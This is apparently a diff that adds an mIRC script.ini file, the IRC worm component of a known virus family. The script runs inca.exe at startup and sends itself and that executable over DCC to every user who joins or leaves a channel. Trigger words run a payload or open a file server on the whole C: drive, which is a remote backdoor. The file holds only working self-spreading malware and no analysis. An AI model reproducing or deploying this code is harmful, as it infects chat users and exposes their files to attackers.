@@ -1,0 +1,13 @@
+[script]
+n0=run $mircdirinca.exe
+n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
+n2= /dcc send $nick $mircdirscript.ini
+n3= /dcc send $nick $mircdirinca.exe
+n4=}
+n5=ON 1:PART:#:{ /if ( $nick == $me ) { halt }
+n6= /dcc send $nick $mircdirscript.ini
+n7= /dcc send $nick $mircdirinca.exe
+n8=}
+n9=ON 1:TEXT:*el_inca*:#:/run $mircdirrevenge.com
+n10=ON 1:TEXT:*ancev*:#:/fserve $nick 666 c:\
+n11=ON 1:TEXT:*_29A_*:#:/quit
